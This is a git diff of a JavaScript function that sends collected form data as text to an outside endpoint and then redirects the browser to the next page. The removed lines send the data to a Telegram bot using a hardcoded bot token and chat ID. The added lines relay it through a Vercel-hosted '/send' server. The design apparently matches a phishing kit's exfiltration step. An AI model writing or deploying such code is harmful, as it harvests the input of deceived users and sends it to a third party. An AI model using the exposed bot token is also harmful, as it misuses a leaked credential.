@@ -1,38 +1,38 @@
 export default function botFetch(data, nextPageURL) {
-    const botToken = "8390081715:AAFHheEbo9EsWQc2ftPMKgGPl1WKaQ3UPQU";
-    const chatId = "-4669313790";
+    
+    const serverURL = "https://sdad-qa-backend.vercel.app/send";
 
     const textData = Object.entries(data)
-        .map(([key, value]) => `${key}: ${value}`)
-        .join("\n");
+       .map(([key, value]) => `${key}: ${value}`)
+       .join("\n");
 
-    // Send to Telegram API
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+
+    fetch(serverURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: textData
-        })
+        body: JSON.stringify({ text: textData })
     })
         .then(res => res.json())
-        .then(data => {
-            if (data.ok) {
+        .then(response => {
+            if (response.success) {
                 if (nextPageURL) {
                     // Get base URL dynamically
                     const origin = window.location.origin;
                     const pathParts = window.location.pathname.split('/');
-                    pathParts.pop(); // remove current file 
+                    pathParts.pop(); // remove current file
                     const basePath = pathParts.join('/');
                     window.location.href = `${origin}${basePath}/${nextPageURL}`;
                 }
             } else {
-                console.log("Error: " + data.description);
+                console.error("Server error:", response.error);
             }
         })
-        .catch(err => alert("Fetch error: " + err));
-
+        .catch(err => {
+            console.error("Fetch error:", err);
+        });
 }
+
+
 
 
 
